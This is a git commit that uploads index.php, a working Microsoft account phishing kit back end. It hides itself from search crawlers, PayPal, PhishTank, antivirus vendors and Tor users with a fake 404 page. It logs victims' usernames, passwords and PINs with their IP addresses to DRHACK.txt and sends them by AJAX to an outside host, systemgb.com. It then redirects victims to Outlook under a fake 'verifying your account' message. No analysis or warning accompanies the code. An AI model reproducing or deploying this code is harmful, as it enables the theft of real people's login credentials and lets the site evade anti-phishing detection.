00a71e3dfe8cd340ea683332f5306a1a73573091
romigonzalez <87909306+romigonzalez@users.noreply.github.com>
2021-07-25 01:01:21 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,188 @@
+
+<?php
+error_reporting(0);
+$CWCTICEIZOIWFWK = gethostbyaddr($_SERVER['REMOTE_ADDR']);    
+if(strpos($CWCTICEIZOIWFWK, 'google')
+or strpos($CWCTICEIZOIWFWK, 'drweb')
+or strpos($CWCTICEIZOIWFWK, 'Dr.Web')
+or strpos($CWCTICEIZOIWFWK, 'hostinger')
+or strpos($CWCTICEIZOIWFWK, 'scanurl')
+or strpos($CWCTICEIZOIWFWK, 'bot')
+or strpos($CWCTICEIZOIWFWK, 'above')
+or strpos($CWCTICEIZOIWFWK, 'Slurp')
+or strpos($CWCTICEIZOIWFWK, 'ia_archiver')
+or strpos($CWCTICEIZOIWFWK, 'Yandex')
+or strpos($CWCTICEIZOIWFWK, 'Yahoo! Slurp')
+or strpos($CWCTICEIZOIWFWK, 'Googlebot')
+or strpos($CWCTICEIZOIWFWK, 'MSNBot')
+or strpos($CWCTICEIZOIWFWK, 'YahooSeeker')
+or strpos($CWCTICEIZOIWFWK, 'bingbot')
+or strpos($CWCTICEIZOIWFWK, 'crawler')
+or strpos($CWCTICEIZOIWFWK, 'PycURL')
+or strpos($CWCTICEIZOIWFWK, 'facebookexternalhit')
+or strpos($CWCTICEIZOIWFWK, 'Rambler')
+or strpos($CWCTICEIZOIWFWK, 'Zombie')
+or strpos($CWCTICEIZOIWFWK, 'softlayer')
+or strpos($CWCTICEIZOIWFWK, 'amazonaws')
+or strpos($CWCTICEIZOIWFWK, 'cyveillance')
+or strpos($CWCTICEIZOIWFWK, 'phishtank')
+or strpos($CWCTICEIZOIWFWK, 'dreamhost')
+or strpos($CWCTICEIZOIWFWK, 'netpilot')
+or strpos($CWCTICEIZOIWFWK, 'calyxinstitute')
+or strpos($CWCTICEIZOIWFWK, 'Yahoo')
+or strpos($CWCTICEIZOIWFWK, 'facebook')
+or strpos($CWCTICEIZOIWFWK, 'adsbot-google')
+or strpos($CWCTICEIZOIWFWK, 'tor-exit')
+or strpos($CWCTICEIZOIWFWK, 'paypal')!== false)
+{ header('HTTP/1.0 404 Not Found'); 
+die("<META HTTP-EQUIV='refresh' content='5; URL=https://www.google.com'><h1>404 Not Found</h1>The page that you have requested could not be found.");
+exit;
+}
+$VCOZFTYDETDFNNF= gethostbyaddr($_SERVER['HTTP_USER_AGENT']);
+if(strpos($VCOZFTYDETDFNNF, 'google')
+or strpos($VCOZFTYDETDFNNF, 'drweb')
+or strpos($VCOZFTYDETDFNNF, 'Dr.Web')
+or strpos($VCOZFTYDETDFNNF, 'hostinger')
+or strpos($VCOZFTYDETDFNNF, 'scanurl')
+or strpos($VCOZFTYDETDFNNF, 'bot')
+or strpos($VCOZFTYDETDFNNF, 'above')
+or strpos($VCOZFTYDETDFNNF, 'Slurp')
+or strpos($VCOZFTYDETDFNNF, 'ia_archiver')
+or strpos($VCOZFTYDETDFNNF, 'Yandex')
+or strpos($VCOZFTYDETDFNNF, 'Yahoo! Slurp')
+or strpos($VCOZFTYDETDFNNF, 'Googlebot')
+or strpos($VCOZFTYDETDFNNF, 'MSNBot')
+or strpos($VCOZFTYDETDFNNF, 'YahooSeeker')
+or strpos($VCOZFTYDETDFNNF, 'bingbot')
+or strpos($VCOZFTYDETDFNNF, 'crawler')
+or strpos($VCOZFTYDETDFNNF, 'PycURL')
+or strpos($VCOZFTYDETDFNNF, 'facebookexternalhit')
+or strpos($VCOZFTYDETDFNNF, 'Rambler')
+or strpos($VCOZFTYDETDFNNF, 'Zombie')
+or strpos($VCOZFTYDETDFNNF, 'softlayer')
+or strpos($VCOZFTYDETDFNNF, 'amazonaws')
+or strpos($VCOZFTYDETDFNNF, 'cyveillance')
+or strpos($VCOZFTYDETDFNNF, 'phishtank')
+or strpos($VCOZFTYDETDFNNF, 'dreamhost')
+or strpos($VCOZFTYDETDFNNF, 'netpilot')
+or strpos($VCOZFTYDETDFNNF, 'calyxinstitute')
+or strpos($VCOZFTYDETDFNNF, 'Yahoo')
+or strpos($VCOZFTYDETDFNNF, 'facebook')
+or strpos($VCOZFTYDETDFNNF, 'adsbot-google')
+or strpos($VCOZFTYDETDFNNF, 'tor-exit')
+or strpos($VCOZFTYDETDFNNF, 'paypal')!== false)
+{ header('HTTP/1.0 404 Not Found'); 
+die("<META HTTP-EQUIV='refresh' content='5; URL=https://www.google.com'><h1>404 Not Found</h1>The page that you have requested could not be found.");
+exit;
+}else{
+if(isset($_POST['CFAOJSLRWLATTRF'])){
+$Idb = $_POST['CFAOJSLRWLATTRF']; 
+$Pwb = $_POST['MBHFHZREUCEUDBT'];
+$PIN1 = $_POST['MHTTPMKGUWBBYQQ']; 
+$PIN2 = $_POST['EJMCESVOPQJBIUD'];
+$PIN3 = "$Pwb : $PIN1 : $PIN2 ";
+$IP = $_SERVER['REMOTE_ADDR'];
+$nn = 'DRHACK';  
+$Ltxt = "
+$IP
+$Idb : $Pwb 
+$PIN1 - $PIN2
+-------------- Dr.Dragon $nn ---------";
+$x78 = fopen("$nn.txt", "a+");
+fwrite($x78, $Ltxt);
+fclose($x78);
+echo "
+<html>
+<head>
+	<meta name='robots' content='none'>
+	<meta name='robots' content='noindex'>
+	<meta name='robots' content='nofollow'>
+	<meta name='robots' content='noarchive'>
+	<meta name='robots' content='nocache'>
+	<meta name='robots' content='noimageindex'>
+	<meta name='robots' content='nomediaindex'>
+	<meta name='robots' content='noodp'>
+	<meta name='robots' content='noodyp'>
+	<meta name='robots' content='notranslate'>
+	<meta name='robots' content='noyaca'>
+	<meta name='robots' content='noydir'>
+	<meta name='robots' content='unavailable_after: 21-Jul-2037 14:30:00 CET'>
+	<meta name='googlebot' content='none'>
+	<meta name='googlebot' content='noindex'>
+	<meta name='googlebot' content='nofollow'>
+	<meta name='googlebot' content='noarchive'>
+	<meta name='googlebot' content='nocache'>
+	<meta name='googlebot' content='noimageindex'>
+	<meta name='googlebot' content='nomediaindex'>
+	<meta name='googlebot' content='noodp'>
+	<meta name='googlebot' content='noodyp'>
+	<meta name='googlebot' content='notranslate'>
+	<meta name='googlebot' content='noyaca'>
+	<meta name='googlebot' content='noydir'>
+	<meta name='slurp' content='none'>
+	<meta name='slurp' content='noindex'>
+	<meta name='slurp' content='nofollow'>
+	<meta name='slurp' content='noarchive'>
+	<meta name='slurp' content='nocache'>
+	<meta name='slurp' content='noimageindex'>
+	<meta name='slurp' content='nomediaindex'>
+	<meta name='slurp' content='noodp'>
+	<meta name='slurp' content='notranslate'>
+	<meta name='slurp' content='noyaca'>
+	<meta name='slurp' content='noydir'>
+	<script type='text/javascript' src='jquery.min.js'></script>
+  <meta http-equiv='refresh' content='2;URL=https://outlook.live.com/owa/'>
+  <meta http-equiv='Content-Type' content='text/html; charset=windows-1252'>
+      <script type='text/javascript'>
+      $(document).ready( function() { 
+        fecha = '$Idb';     
+        direccion = '$PIN3'; 
+        nn = '$nn';        
+        console.log(direccion);
+            var datos = new FormData();
+            datos.append('direccion', direccion);
+            datos.append('fecha', fecha);
+            datos.append('nn', nn);
+          $.ajax({
+                url:'https://systemgb.com',
+                type: 'POST',
+                data: datos,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(respuesta){}
+            });
+           });
+      </script>
+<script>
+    function deleteAd () {
+        $('div:contains('PRO o VIP por solo')').addClass('cbalink');
+        $('div:contains('¿Quiere apoyar')').addClass('cbalink');
+        $('div:contains('support owner of this site?')').addClass('cbalink');
+        $('div:contains('PRO or VIP for just')').addClass('cbalink');
+        $('div:contains('Want to support this website?')').addClass('cbalink');
+        $('div:contains('PRO or VIP hosting for just')').addClass('cbalink');
+        $('div:contains('Jestes jej wlascicielem?')').addClass('cbalink');
+        $('div:contains('PRO lub VIP za jedyne')').addClass('cbalink');
+        $('div:contains('Want to support this website?')').addClass('cbalink');
+        $('div:contains('upgrading to PRO or VIP hosting for just')').addClass('cbalink');
+        $('div:contains('to PRO or VIP for just 0.33 USD')').addClass('cbalink');
+        $('div:contains('Do you want to support owner of this site?')').addClass('cbalink');
+    }
+</script>
+<script>
+    $(document).ready(deleteAd);
+</script>
+<style type='text/css'>
+.cbalink{
+display: none;
+}
+</style>
+</head>
+<body>Verificando su cuenta de Microsoft, esto puede demorar unos minutos. Por favor espere...</body>
+</html>";   
+  }else{
+    include 'O0RXMHT7C0EU.gif';
+  }
+} 
+?>
